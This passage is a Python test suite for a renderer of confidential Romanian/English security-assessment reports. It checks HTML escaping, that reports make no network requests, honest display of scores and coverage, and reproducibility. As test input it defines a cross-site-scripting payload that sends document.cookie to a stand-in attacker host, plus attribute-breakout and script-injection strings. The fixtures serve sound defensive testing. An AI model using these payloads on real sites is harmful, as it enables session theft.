"""What a report must never do, and what it must always say.

A report is the one artefact that leaves this platform. It is downloaded, forwarded, and
opened by somebody signed in to something else, possibly a year later and offline. So the
properties it has to hold are unusually strict: it cannot execute anything it was given,
it cannot reach the network, it cannot say more than the evidence supports, and it has to
render identically every time or it cannot be defended when disputed.
"""

from __future__ import annotations

import re
from datetime import UTC, datetime

import pytest
from siembiot.reports import _INTERNAL_ATTRIBUTES
from siembiot_worker.reports import (
    LOCALES,
    ReportAssetGroup,
    ReportCap,
    ReportCheck,
    ReportDocument,
    ReportEvidence,
    ReportFinding,
    ReportInsight,
    ReportPillar,
    render_report,
)
from siembiot_worker.reports.html import _TEXT

OBSERVED = datetime(2026, 8, 5, 9, 30, tzinfo=UTC)
GENERATED = datetime(2026, 8, 5, 12, 0, tzinfo=UTC)

#: Text a report can genuinely receive. The subject of a finding can be a host name
#: discovered in a certificate transparency log, which is to say a string somebody else
#: chose and put in a public log on purpose.
HOSTILE = "<script>fetch('https://attacker.test?c='+document.cookie)</script>"


def finding(**overrides: object) -> ReportFinding:
    base = {
        "check_id": "B.dmarc_enforced",
        "severity": "high",
        "subject": "primaria-exemplu.ro",
        "title_ro": "DMARC nu este aplicat",
        "title_en": "DMARC is not enforced",
        "rationale_ro": "Fără DMARC oricine poate trimite e-mail în numele instituției.",
        "rationale_en": "Without DMARC anybody can send e-mail as the institution.",
    }
    return ReportFinding(**{**base, **overrides})  # type: ignore[arg-type]


def visible_text(html: str) -> str:
    """What a reader actually sees, with the stylesheet and the markup removed.

    Added because two tests here were asserting against the raw document and one of them
    had started passing for the wrong reason: the dashboard's stylesheet contains
    `.fill-developing`, so `"developing" in html` was satisfied by a CSS class name while
    the visible text said "In dezvoltare". A band assertion that a stylesheet can satisfy
    is not a band assertion.
    """
    without_style = re.sub(r"<style.*?</style>", " ", html, flags=re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", without_style))


def report(**overrides: object) -> ReportDocument:
    base = {
        "organization_name": "Primăria Exemplu",
        "domain": "primaria-exemplu.ro",
        "score": 62.5,
        "band": "developing",
        "coverage_percentage": 93.7,
        "coverage_sufficient": True,
        "methodology_version": "1.1.0",
        "policy_digest": "77fc0d7fc40cc7ecc8567ecf7752137b63f6313dbdef42971bfafd7529abcf16",
        "assessment_mode": "passive_observation",
        "observed_at": OBSERVED,
        "generated_at": GENERATED,
        "findings": (finding(),),
    }
    return ReportDocument(**{**base, **overrides})  # type: ignore[arg-type]


# -- injection -----------------------------------------------------------------------


@pytest.mark.parametrize(
    "field",
    ["organization_name", "domain"],
)
def test_hostile_text_in_the_header_is_not_markup(field: str) -> None:
    html = render_report(report(**{field: HOSTILE}))

    assert "<script>" not in html
    assert "&lt;script&gt;" in html


def test_a_host_name_from_a_certificate_log_is_not_markup() -> None:
    """The subject of a finding is the most exposed field in the document: it can be a
    name somebody registered, obtained a certificate for, and thereby placed in a public
    log, specifically so that it would be read by something like this."""
    html = render_report(report(findings=(finding(subject=HOSTILE),)))

    assert "<script>" not in html
    assert "attacker.test" in html  # present as text, so the reader can still see it


def test_hostile_text_in_guidance_is_not_markup() -> None:
    html = render_report(
        report(
            findings=(
                finding(
                    remediation_summary_ro=HOSTILE,
                    remediation_summary_en=HOSTILE,
                    remediation_steps_ro=(HOSTILE,),
                    remediation_steps_en=(HOSTILE,),
                    remediation_caveat_ro=HOSTILE,
                    remediation_caveat_en=HOSTILE,
                ),
            )
        )
    )

    assert "<script>" not in html


def test_an_attribute_cannot_be_escaped_out_of() -> None:
    """A severity arriving from data lands in a class attribute. Breaking out of it
    would be enough to add an event handler without ever writing a tag."""
    html = render_report(report(findings=(finding(severity='" onload="alert(1)'),)))

    assert 'onload="alert(1)"' not in html
    assert "&quot;" in html


# -- no network ----------------------------------------------------------------------


def test_the_report_fetches_nothing() -> None:
    """It is opened from a downloads folder, offline, possibly a year later. A page that
    fetches anything also tells whoever hosts that thing when a confidential document was
    opened, and by whom."""
    html = render_report(report())

    assert "<link" not in html
    assert "src=" not in html
    assert "@import" not in html
    assert "url(" not in html
    # No absolute URL anywhere. Checked against the whole document rather than against a
    # list of elements that can fetch, because that list grows and this assertion does
    # not have to know it.
    assert re.findall(r"https?://\S+", html) == []


# -- honesty ------------------------------------------------------------------------


def test_no_band_is_printed_below_the_coverage_floor() -> None:
    """The floor removes the band, not the number. Printing a band from thin evidence is
    the single most misleading thing this report could do: a band is a conclusion, and a
    reader who sees one assumes somebody was entitled to draw it."""
    # `managed` rather than `resilient`, and the choice is the test. The scale beneath
    # the score is labelled with the extremes -- Critic and Rezilient -- so those two
    # words appear whatever the result, and asserting their absence would be a test about
    # the layout. "Gestionat" appears only if a band was awarded.
    html = render_report(report(coverage_sufficient=False, band="managed"))
    shown = visible_text(html)

    assert "Gestionat" not in shown, "a band was awarded below the coverage floor"
    assert "93.7%" in shown
    assert "62.5" in shown


def test_the_band_is_printed_when_coverage_supports_it() -> None:
    """In the reader's language, not as the identifier.

    The methodology carries `label_ro` and `label_en` for every band, and this report
    printed the raw `developing` into an otherwise Romanian document.
    """
    shown = visible_text(render_report(report()))

    assert "In dezvoltare" in shown.replace("î", "i").replace("Î", "I")
    assert "developing" not in shown


def test_inconclusive_checks_are_named_and_not_read_as_clean() -> None:
    html = render_report(report(undetermined_checks=("C.tls_protocol_posture",)))

    assert "C.tls_protocol_posture" in html
    for locale in LOCALES:
        rendered = render_report(report(undetermined_checks=("C.tls_protocol_posture",)), locale)
        assert "C.tls_protocol_posture" in rendered


def test_withheld_checks_are_separated_from_inconclusive_ones() -> None:
    """A check nobody was authorized to perform is not a check that was attempted and
    failed. Listing them together would report a passive run as though it had tried."""
    html = render_report(
        report(
            undetermined_checks=("C.tls_protocol_posture",),
            withheld_checks=("D.remote_access_exposed",),
        ),
        "en",
    )

    assert html.index("D.remote_access_exposed") > html.index("C.tls_protocol_posture")
    assert "not attempted" in html


def test_draft_guidance_says_it_is_draft() -> None:
    """A public body acting on advice nobody has reviewed should be told that is what it
    is -- on the page carrying the advice, not in a footnote elsewhere."""
    html = render_report(
        report(
            findings=(
                finding(
                    remediation_summary_en="Publish a DMARC record.",
                    remediation_review_status="draft",
                ),
            )
        ),
        "en",
    )

    assert "has not yet been reviewed" in html


def test_a_caveat_is_never_separated_from_its_instruction() -> None:
    """Guidance exists because following it can break something. An instruction rendered
    without its warning is worse than no instruction at all."""
    html = render_report(
        report(
            findings=(
                finding(
                    remediation_steps_en=("Block the port at the firewall.",),
                    remediation_caveat_en="This disconnects anybody who was using it.",
                ),
            )
        ),
        "en",
    )

    assert html.index("disconnects anybody") > html.index("Block the port")


def test_a_finding_says_the_requirement_is_not_met() -> None:
    """The heading of a finding is the check's title, and a check title states the
    condition that *should* hold: "SPF is published and valid". Printed alone under "what
    needs fixing", beside a HIGH badge, it reads as though the good state were the
    problem -- which is how the first rendered report actually read.
    """
    for locale, label in (("ro", "Cerință neîndeplinită"), ("en", "Requirement not met")):
        html = render_report(report(), locale)
        assert label in html
        # Before the title it qualifies, not somewhere further down the page.
        assert html.index(label) < html.index("DMARC")


def test_the_policy_digest_is_printed() -> None:
    """So a disputed report can be checked against the exact catalogue that produced it.
    Without it, "methodology 1.1.0" is a name rather than a proof."""
    assert report().policy_digest in render_report(report())


def test_the_notice_appears_in_both_languages() -> None:
    for locale, phrase in (("ro", "Nu este o garanție"), ("en", "Not a security guarantee")):
        assert phrase in render_report(report(), locale)


def test_every_page_says_confidential() -> None:
    for locale, word in (("ro", "CONFIDENȚIAL"), ("en", "CONFIDENTIAL")):
        assert word in render_report(report(), locale)


def test_romanian_diacritics_survive() -> None:
    """Not transliterated and not entity-mangled: an institution's own name rendered as
    "Primaria" is a small insult printed on every page of its own report."""
    html = render_report(report(organization_name="Primăria Municipiului Târgoviște"), "ro")

    assert "Primăria Municipiului Târgoviște" in html
    assert 'charset="utf-8"' in html


# -- reproducibility ------------------------------------------------------------------


def test_the_same_snapshot_renders_to_the_same_bytes() -> None:
    """Reproducibility is the difference between a report and a screenshot. Anything
    read at render time -- a clock, a dictionary iteration order, a generated id --
    breaks it, and breaks it silently."""
    assert render_report(report()) == render_report(report())


def test_findings_of_equal_severity_have_a_total_order() -> None:
    """Without a tie-break, two findings could swap places between renders of one
    snapshot, and a report that differs from itself is reproducible in no useful sense."""
    findings = (
        finding(check_id="B.spf_present", severity="high"),
        finding(check_id="A.dnssec_enabled", severity="high"),
        finding(check_id="C.hsts_present", severity="critical"),
    )
    ordered = report(findings=findings).findings_by_severity()

    assert [item.check_id for item in ordered] == [
        "C.hsts_present",
        "A.dnssec_enabled",
        "B.spf_present",
    ]
    assert render_report(report(findings=findings)) == render_report(
        report(findings=tuple(reversed(findings)))
    )


def test_a_clean_domain_is_not_an_empty_page() -> None:
    html = render_report(report(findings=()), "en")

    assert "No weakness was identified in the checks that were performed" in html


def test_an_unsupported_locale_is_refused_rather_than_guessed() -> None:
    with pytest.raises(ValueError):
        render_report(report(), "fr")


def test_pillars_without_a_score_say_so_rather_than_showing_zero() -> None:
    """A pillar with nothing applicable scores nothing. Rendering it as 0 would read as
    total failure in an area that was never assessed."""
    html = render_report(
        report(pillars=(ReportPillar(pillar="attack_surface", score=None, weight=0.15),)), "en"
    )

    assert "no score" in html
    assert ">0<" not in html


def test_a_score_whose_evidence_was_erased_says_so() -> None:
    """The report prints a policy digest and a methodology version so a disputed result
    can be checked against the catalogue that produced it. Once retention has removed the
    observations it cannot be, and printing those digests without saying so invites
    exactly the wrong conclusion.

    Said beside the score, not in the footer beside the digests: a reader who takes the
    number and stops reading should still have been told.
    """
    erased = datetime(2026, 11, 2, 3, 0, tzinfo=UTC)
    for locale, phrase in (("ro", "nu mai poate fi recalculat"), ("en", "no longer be recomputed")):
        html = render_report(report(evidence_erased_at=erased), locale)
        assert phrase in html
        assert "2026-11-02" in html
        assert html.index(phrase) < html.index(report().policy_digest)


def test_a_score_with_evidence_intact_makes_no_such_claim() -> None:
    assert "no longer be recomputed" not in render_report(report(), "en")


# -- the dashboard ------------------------------------------------------------------


def test_the_impact_summary_counts_findings_by_severity() -> None:
    """The question a reader opens the report with, answered before the areas.

    A pillar score of 25 does not tell an institution whether to worry this week. "Two
    high, one medium" does, and it is the same evidence stated in the form somebody can
    act on.
    """
    shown = visible_text(render_report(report()))

    assert "Cat de afectata" in shown.replace("â", "a").replace("ă", "a")
    for finding in report().findings:
        assert _TEXT["ro"][f"severity.{finding.severity}"] in shown


#: The areas as a real assessment produces them, including one that could not be scored.
WITH_AREAS = (
    ReportPillar(pillar="attack_surface", score=66.7, weight=0.15),
    ReportPillar(pillar="exposure_hygiene", score=100.0, weight=0.1),
    ReportPillar(pillar="reputation", score=None, weight=0.1),
)


def test_an_area_with_no_score_keeps_its_row_and_says_why() -> None:
    """Dropping it would leave a report silently covering five areas out of six, and a
    reader counting rows would have no way to know one was missing."""
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert "Reputatie" in shown.replace("ț", "t")
    assert "fara scor" in shown.replace("ă", "a").replace("â", "a")
    # And why, rather than leaving the reader to assume the institution has none.
    assert "furnizor" in shown


def test_areas_are_named_in_the_reader_s_language() -> None:
    """`attack_surface` and `exposure_hygiene` were printed raw into a Romanian
    document. They are the identifiers the methodology uses, not words."""
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert "attack_surface" not in shown
    assert "exposure_hygiene" not in shown
    assert "Suprafata de atac" in shown.replace("ț", "t").replace("ă", "a")
    assert "Igiena expunerii" in shown


def test_the_raw_weight_is_not_printed() -> None:
    """`0.15` is a methodology parameter. What a reader needs is whether this area
    matters more than the next one, which is what the word says."""
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert "0.15" not in shown
    assert "importan" in shown


def test_the_bars_carry_their_number_too() -> None:
    """Colour and length are never the only signal. A report is read in greyscale, by
    somebody using a screen reader, and after a stylesheet has failed to load."""
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    for pillar in WITH_AREAS:
        if pillar.score is not None:
            assert f"{pillar.score:g}" in shown


def test_a_bar_cannot_render_wider_than_its_track() -> None:
    """A bar wider than its track is a layout bug that reads as a better result."""
    from siembiot_worker.reports.html import _bar
    from siembiot_worker.reports.markup import render

    assert "width: 100%" in render(_bar(140.0, "resilient"))


def test_a_score_of_zero_still_draws_a_bar() -> None:
    """Zero is a result, not an absence.

    Drawn at its true width it is an empty track, and on the page that is
    indistinguishable from the area which has no score at all -- so the worst possible
    outcome rendered as a missing one. A real report showed it: e-mail scored 0 and the
    row looked unmeasured beside `reputation`, which genuinely was.

    The sliver is small enough that nobody reads it as a quantity, and the number beside
    it says the rest.
    """
    from siembiot_worker.reports.html import _bar
    from siembiot_worker.reports.markup import render

    drawn = render(_bar(0.0, "critical"))

    assert "width: 0%" not in drawn
    assert "fill-critical" in drawn


def test_an_area_with_no_score_draws_no_bar_at_all() -> None:
    """The other half of the same distinction. If both zero and absent drew a bar, the
    sliver above would have removed the difference rather than preserved it."""
    shown = render_report(
        report(pillars=(ReportPillar(pillar="reputation", score=None, weight=0.1),))
    )

    # The row exists and says why, and there is no track for it to be misread as a
    # very low score.
    assert "fara scor" in visible_text(shown).replace("ă", "a")
    assert "track" not in shown.split("Reputa")[1].split("</tr>")[0]


def test_report_band_labels_match_the_methodology() -> None:
    """The labels exist in the catalogue; the report used to ignore them.

    Two copies of the same words in two files is how a report ends up printing
    `developing` to a Romanian reader while the methodology has said "În dezvoltare"
    all along. This makes the duplication safe by making a divergence fail here.
    """
    import json
    from pathlib import Path

    catalogue = json.loads(
        (
            Path(__file__).resolve().parents[2]
            / "packages"
            / "policy"
            / "methodology"
            / "v1.1.0.json"
        ).read_text(encoding="utf-8")
    )
    bands = catalogue["bands"]

    assert bands, "no bands in the methodology; this test is checking nothing"
    for band in bands:
        assert _TEXT["ro"][f"band.{band['band']}"] == band["label_ro"], band["band"]
        assert _TEXT["en"][f"band.{band['band']}"] == band["label_en"], band["band"]


def test_every_pillar_the_methodology_weights_has_a_label() -> None:
    """An area added to the methodology and not translated shows up as its identifier.
    That is ugly enough that somebody fixes it, which is the intended failure mode --
    but it should fail here first, before an institution reads it."""
    import json
    from pathlib import Path

    catalogue = json.loads(
        (
            Path(__file__).resolve().parents[2]
            / "packages"
            / "policy"
            / "methodology"
            / "v1.1.0.json"
        ).read_text(encoding="utf-8")
    )
    weights = catalogue["pillar_weights"]

    assert weights, "no pillars in the methodology; this test is checking nothing"
    for pillar in weights:
        for locale in ("ro", "en"):
            assert f"pillar.{pillar}" in _TEXT[locale], f"{pillar} has no {locale} label"


def test_the_legend_explains_which_direction_is_good() -> None:
    """The gap a coloured bar leaves open.

    A reader seeing amber at 66.7 and green at 100 has no way to know whether high is
    good, and nothing else on the page says so. Colour without a key is decoration that
    looks like information.
    """
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert "Cum se citesc culorile" in shown
    assert "100 este cel mai bun rezultat" in shown


def test_the_legend_names_every_band_with_its_range() -> None:
    """Derived from the same band floors the bars are coloured from, so a methodology
    that re-cuts its bands moves the legend with it rather than leaving a caption that
    describes the previous scale."""
    from siembiot_worker.reports.html import _BAND_FLOORS

    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert _BAND_FLOORS, "no bands; this test is checking nothing"
    for band, floor in _BAND_FLOORS:
        assert _TEXT["ro"][f"band.{band}"] in shown, band
        assert f"{floor:g}" in shown, f"{band} floor missing from the legend"


def test_the_legend_ranges_are_contiguous_and_reach_100() -> None:
    """A gap between two bands would leave scores the legend does not explain, and an
    overlap would give one score two colours. Either makes the key wrong in a way a
    reader cannot detect."""
    from siembiot_worker.reports.html import _BAND_FLOORS

    floors = [floor for _, floor in _BAND_FLOORS]

    assert floors[0] == 0.0, "the scale does not start at zero"
    assert floors == sorted(floors), "bands are out of order"
    assert len(set(floors)) == len(floors), "two bands share a floor"


# -- evidence beside the instruction --------------------------------------------------


def _finding_with_evidence(**overrides: object) -> ReportFinding:
    base: dict[str, object] = dict(
        check_id="B.dmarc_enforced",
        severity="high",
        subject="primaria-exemplu.ro",
        title_ro="DMARC este publicat cu politică de aplicare",
        title_en="DMARC is published with an enforcing policy",
        rationale_ro="DMARC indică destinatarilor cum să trateze mesajele nealiniate.",
        rationale_en="DMARC tells recipients how to treat unaligned mail.",
        evidence=(("present", "false"), ("policy", "none"), ("record", "v=DMARC1; p=none")),
        evidence_status="absent",
    )
    base.update(overrides)
    return ReportFinding(**base)  # type: ignore[arg-type]


def test_a_finding_shows_what_was_observed_not_only_what_to_change() -> None:
    """The gap this closes.

    "Publish DMARC" is an instruction. "No DMARC record was returned" is the reason, and
    a public body being asked to change its DNS is entitled to the second before acting
    on the first.
    """
    shown = visible_text(render_report(report(findings=(_finding_with_evidence(),))))

    assert "Ce am observat" in shown
    assert "v=DMARC1; p=none" in shown


def test_an_absence_with_nothing_to_show_is_not_shown() -> None:
    """A box headed "what we observed" whose only content is the word "missing".

    It sits under a title that already says the record is not published, inside a column
    already headed "requirements not met". Restating the verdict there teaches a reader
    to skip the box -- including on the findings where the box carries the whole answer.
    """
    shown = visible_text(
        render_report(
            report(findings=(_finding_with_evidence(evidence=(), evidence_status="absent"),))
        )
    )
    assert _TEXT["ro"]["evidence_heading"] not in shown


def test_an_absence_that_has_something_to_show_is_still_shown() -> None:
    """Hiding is driven by there being nothing to say, not by the status.

    Several collectors record an absence alongside a measurement -- MTA-STS reports
    `present: no` while the observation itself was made -- and those must keep their
    evidence. Only the case with no attributes at all disappears.
    """
    shown = visible_text(
        render_report(
            report(
                findings=(
                    _finding_with_evidence(
                        evidence=(("present", "false"),),
                        evidence_status="absent",
                    ),
                )
            )
        )
    )
    assert _TEXT["ro"]["evidence_heading"] in shown
    assert _TEXT["ro"]["attr.present"] in shown


def test_a_check_we_could_not_run_still_says_so_with_nothing_else() -> None:
    """`inconclusive` is never hidden, however little accompanies it.

    "We could not check this" is implied by nothing else on the page, and dropping it
    would let a gap in our own measurement read as a fact about the institution -- the
    same inversion the third column of the summary exists to prevent.
    """
    shown = visible_text(
        render_report(
            report(findings=(_finding_with_evidence(evidence=(), evidence_status="inconclusive"),))
        )
    )
    assert _TEXT["ro"]["obs.inconclusive"] in shown


def test_evidence_appears_before_the_remediation() -> None:
    """An instruction read before its reason is one somebody applies without checking
    whether it matches what their own infrastructure does."""
    shown = visible_text(
        render_report(
            report(
                findings=(
                    _finding_with_evidence(
                        remediation_summary_ro="Publică DMARC.",
                        remediation_steps_ro=("Publică '_dmarc' cu 'p=none'.",),
                    ),
                )
            )
        )
    )

    assert shown.index("Ce am observat") < shown.index("Ce este de făcut")


def test_hostile_evidence_cannot_break_out_of_the_page() -> None:
    """Every value here came from somebody else's infrastructure. A mail server greeting
    or an HTTP header is an attacker-controlled string that this report renders."""
    html = render_report(
        report(
            findings=(
                _finding_with_evidence(
                    evidence=(("banner", "<script>alert(1)</script>"),),
                ),
            )
        )
    )

    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;" in html


def test_booleans_read_as_words_rather_than_as_json() -> None:
    """`false` is a value from a payload. A report is read by somebody who does not know
    what a payload is."""
    shown = visible_text(
        render_report(report(findings=(_finding_with_evidence(evidence=(("present", "false"),)),)))
    )

    assert " nu" in shown
    assert "false" not in shown


def test_no_two_text_keys_collide() -> None:
    """A duplicate key in the text table silently replaces the first.

    `observed` was the label for the observation timestamp, and an evidence heading added
    under the same name overwrote it -- the report would have printed "Ce am observat"
    where it meant "Observat la", and every test still passed. Caught by the linter that
    time; asserted here so it does not depend on one.
    """
    import ast
    from pathlib import Path as _Path

    source = (
        _Path(__file__).resolve().parents[2] / "services/worker/src/siembiot_worker/reports/html.py"
    ).read_text(encoding="utf-8")

    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Dict):
            continue
        literals = [
            k.value for k in node.keys if isinstance(k, ast.Constant) and isinstance(k.value, str)
        ]
        duplicates = sorted({key for key in literals if literals.count(key) > 1})
        assert not duplicates, f"repeated text keys: {duplicates}"


def test_both_locales_describe_the_same_things() -> None:
    """A key present in one language and not the other renders a KeyError for whoever
    picked the other language, which is nobody's fault but is always the same nobody."""
    assert set(_TEXT["ro"]) == set(_TEXT["en"])


def _collector_attributes() -> tuple[set[str], set[str]]:
    """Every observation type the normalizer emits, and every attribute name it can put
    on one.

    Read out of the normalizer's own source rather than listed here, because a list
    maintained by hand is a list that stops matching the collectors the first week
    somebody adds one, and the failure of that list is silent: the report shows a raw
    attribute name and nobody notices for a release.

    Only the dictionary handed over as the attributes argument counts. Walking deeper
    would collect the keys inside `hosts` and `open_ports`, which are the shape of a list
    item and never appear as a row label -- an earlier version of this did exactly that
    and demanded labels for `banner` and `asn`.
    """
    import ast
    from pathlib import Path as _Path

    source = (
        _Path(__file__).resolve().parents[2]
        / "services/worker/src/siembiot_worker/policy/normalization.py"
    ).read_text(encoding="utf-8")

    types: set[str] = set()
    names: set[str] = set()
    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        is_make = isinstance(func, ast.Attribute) and func.attr == "make"
        is_ctor = isinstance(func, ast.Name) and func.id == "NormalizedObservation"
        if not (is_make or is_ctor):
            continue

        if is_make and node.args:
            first = node.args[0]
            if isinstance(first, ast.Constant) and isinstance(first.value, str):
                types.add(first.value)
        for keyword in node.keywords:
            if keyword.arg != "observation_type":
                continue
            if isinstance(keyword.value, ast.Constant) and isinstance(keyword.value.value, str):
                types.add(keyword.value.value)

        argument: ast.expr | None = None
        if is_make and len(node.args) >= 3:
            argument = node.args[2]
        for keyword in node.keywords:
            if keyword.arg == "attributes":
                argument = keyword.value
        # `{...} if conclusive else None` is how an inconclusive observation drops its
        # attributes, so both branches are candidates and neither is nested data.
        candidates: list[ast.expr | None] = (
            [argument.body, argument.orelse] if isinstance(argument, ast.IfExp) else [argument]
        )
        for candidate in candidates:
            if isinstance(candidate, ast.Dict):
                names.update(
                    key.value
                    for key in candidate.keys
                    if isinstance(key, ast.Constant) and isinstance(key.value, str)
                )
    # Attribute dictionaries built by a helper rather than written at the call site.
    # `_looked_for` returns one, and without this the label for what it emits looks dead
    # -- which would have this test demand the removal of a label that is in use.
    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Return) or not isinstance(node.value, ast.Dict):
            continue
        names.update(
            key.value
            for key in node.value.keys
            if isinstance(key, ast.Constant) and isinstance(key.value, str)
        )
    return types, names


def test_every_collector_attribute_has_a_label() -> None:
    """An unlabelled attribute reaches the page as `distinct_parent_count`.

    That is not wrong, it is unreadable, and this report is written for an institution
    that does not employ anybody who reads it fluently. The point of the whole evidence
    section is lost one row at a time.
    """
    _, names = _collector_attributes()
    unlabelled = sorted(
        name
        for name in names - _INTERNAL_ATTRIBUTES
        if f"attr.{name}" not in _TEXT["ro"]
        and not any(key.endswith(f".{name}") for key in _TEXT["ro"] if key.startswith("attr."))
    )
    assert not unlabelled, f"collector attributes with no reader-facing name: {unlabelled}"


def test_no_label_describes_an_attribute_no_collector_emits() -> None:
    """The other direction, and the one that rots quietly.

    A label for an attribute that no longer exists is invisible -- it renders nowhere and
    breaks nothing -- so it survives every review and makes the table look more complete
    than it is. It also hides the real failure: when a collector is renamed, the old label
    stays and the new name goes unlabelled, and only this half of the pair notices.
    """
    types, names = _collector_attributes()
    stale = []
    for key in _TEXT["ro"]:
        if not key.startswith("attr."):
            continue
        remainder = key[len("attr.") :]
        if remainder in names:
            continue
        observation_type, _, name = remainder.rpartition(".")
        if observation_type in types and name in names:
            continue
        stale.append(key)
    assert not sorted(stale), f"labels for attributes nothing emits: {sorted(stale)}"


def test_an_unlabelled_attribute_is_shown_rather_than_dropped() -> None:
    """The fall-back, asserted rather than assumed.

    A collector that starts reporting something new must not have it silently disappear
    from the report while the label is being written. An ugly row is a fixable oversight;
    a missing row is the report saying less than it knows, which is the failure this
    entire section exists to prevent.
    """
    document = report(
        findings=(
            finding(evidence=(("newly_invented_attribute", "7"),), evidence_status="observed"),
        )
    )
    page = render_report(document, locale="ro")
    assert "newly_invented_attribute" in page
    assert ">7<" in page


def test_an_attribute_means_what_its_observation_type_says_it_means() -> None:
    """`days_until_expiry` is weeks of warning on a certificate and the domain itself on a
    registration. Telling a mayor the wrong one is worse than telling them neither."""
    rows = (("days_until_expiry", "12"),)
    certificate = render_report(
        report(
            findings=(
                finding(evidence=rows, evidence_status="observed", evidence_type="tls.certificate"),
            )
        ),
        locale="ro",
    )
    registration = render_report(
        report(
            findings=(
                finding(
                    evidence=rows, evidence_status="observed", evidence_type="rdap.registration"
                ),
            )
        ),
        locale="ro",
    )
    assert "expirarea certificatului" in certificate
    assert "expirarea certificatului" not in registration
    assert "expirarea înregistrării domeniului" in registration


def test_a_coded_value_is_rendered_as_the_thing_it_means() -> None:
    """`p=none` is not a policy an institution can weigh. The reader's question is whether
    anything is currently being stopped, and the coded form does not answer it."""
    page = render_report(
        report(findings=(finding(evidence=(("policy", "none"),), evidence_status="observed"),)),
        locale="ro",
    )
    assert "doar raportare" in page
    assert ">none<" not in page


def test_an_unknown_coded_value_is_shown_as_it_arrived() -> None:
    """Values come from other people's DNS and policy files, so the vocabulary is theirs,
    not ours. One we do not recognise is still evidence and is still shown."""
    page = render_report(
        report(
            findings=(
                finding(evidence=(("mode", "quarantine_maybe"),), evidence_status="observed"),
            )
        ),
        locale="ro",
    )
    assert "quarantine_maybe" in page


def test_a_coded_value_cannot_smuggle_markup_through_its_lookup() -> None:
    """The value is a dictionary key and never a format string, but the row it lands in is
    still hostile text from somebody else's infrastructure."""
    page = render_report(
        report(findings=(finding(evidence=(("policy", HOSTILE),), evidence_status="observed"),)),
        locale="ro",
    )
    assert "<script>" not in page
    assert "&lt;script&gt;" in page


def test_a_breakdown_is_rendered_as_categories_and_counts() -> None:
    """Open ports arrive as a mapping, and a mapping was silently dropped.

    `_readable` returned None for anything it did not recognise, so the one attribute that
    says *what kind* of services are exposed never reached the page -- and no test noticed,
    because every other attribute rendered. The label test found it; this keeps the
    rendering itself honest, which the label test does not check.
    """
    from siembiot.reports import _evidence_rows

    rows = _evidence_rows(
        {"open_by_exposure": {"remote_access": 2, "database": 1, "management": 0}}
    )
    assert rows == (("open_by_exposure", "remote_access:2, database:1"),)

    page = render_report(
        report(findings=(finding(evidence=rows, evidence_status="observed"),)), locale="ro"
    )
    assert "acces la distanță: 2" in page
    assert "bază de date: 1" in page
    # Nothing open in that category is not a finding about that category.
    assert "administrare" not in page


def test_a_truncated_evidence_list_says_so() -> None:
    """The row cap is the same mistake this section was built to fix.

    A reader who is not told the list was cut has no way to know it was: twelve rows and
    a full stop looks exactly like twelve rows and nothing more. No collector emits
    enough attributes to reach the cap today, which is precisely why nobody would notice
    the day one does.
    """
    from siembiot.reports import _MAX_EVIDENCE_ROWS, _evidence_omitted, _evidence_rows

    attributes = {f"attribute_{index}": index + 1 for index in range(_MAX_EVIDENCE_ROWS + 5)}
    rows = _evidence_rows(attributes)
    assert len(rows) == _MAX_EVIDENCE_ROWS
    assert _evidence_omitted(attributes, len(rows)) == 5

    page = render_report(
        report(findings=(finding(evidence=rows, evidence_status="observed", evidence_omitted=5),)),
        locale="ro",
    )
    assert "neafișate aici" in page
    assert ">5<" in page


def test_nothing_omitted_says_nothing() -> None:
    """A row reading "0 further" on every finding in the report is noise that trains the
    reader to stop reading the table."""
    page = render_report(
        report(findings=(finding(evidence=(("present", "false"),), evidence_status="absent"),)),
        locale="ro",
    )
    assert "neafișate aici" not in page


def check(check_id: str, outcome: str) -> ReportCheck:
    return ReportCheck(
        check_id=check_id,
        title_ro=f"Titlu {check_id}",
        title_en=f"Title {check_id}",
        outcome=outcome,
    )


#: One of each recorded outcome, which is the only arrangement that can tell the columns
#: apart. A fixture of all-passes would render identically whichever column it went to.
MIXED = (
    check("A.one", "pass"),
    check("A.two", "fail"),
    check("A.three", "warning"),
    check("A.four", "unknown"),
    check("A.five", "not_applicable"),
)


def _column_counts(page: str) -> dict[str, int]:
    """The number each column heading claims, read back off the rendered page."""
    counts = {}
    for name in ("checked_ok", "checked_action", "checked_unknown"):
        label = re.escape(_TEXT["ro"][name])
        match = re.search(rf"{label} \((\d+)\)", page)
        counts[name] = int(match.group(1)) if match else -1
    return counts


def test_a_passing_check_is_shown_not_only_the_failures() -> None:
    """The report listed what was wrong and nothing else.

    Five checks passing and four returning nothing were both rendered as silence, and
    silence reads as "fine" -- so an institution could read a page with eight problems on
    it and reasonably conclude everything else had been tested and was healthy.
    """
    page = render_report(report(checks=MIXED), locale="ro")
    assert _TEXT["ro"]["checked_heading"] in page
    assert "Titlu A.one" in page
    assert _column_counts(page)["checked_ok"] == 1


def test_each_locale_gets_its_own_check_titles() -> None:
    """Titles come in both languages and only one may be shown. Nothing asserted which,
    so a renderer that always reached for the Romanian one would have gone unnoticed by
    every reader who asked for English."""
    checks = (
        ReportCheck(
            check_id="A.one", title_ro="Titlu românesc", title_en="English title", outcome="pass"
        ),
    )
    romanian = render_report(report(checks=checks), locale="ro")
    english = render_report(report(checks=checks), locale="en")
    assert "Titlu românesc" in romanian and "English title" not in romanian
    assert "English title" in english and "Titlu românesc" not in english


def test_a_check_we_could_not_run_is_never_shown_as_passing() -> None:
    """The property the whole section exists for.

    Folding `unknown` into the green column turns "we never reached the site over HTTPS"
    into a reassurance about HTTPS. Folding it into the red column is the opposite lie,
    inventing a weakness out of a measurement we do not have. It gets its own column, and
    a sentence saying grey is not green -- because a colour alone does not say that.
    """
    page = render_report(report(checks=MIXED), locale="ro")
    counts = _column_counts(page)
    assert counts["checked_unknown"] == 1
    assert counts["checked_ok"] == 1
    assert counts["checked_action"] == 2
    assert _TEXT["ro"]["checked_unknown_note"] in page


def test_the_columns_account_for_every_check() -> None:
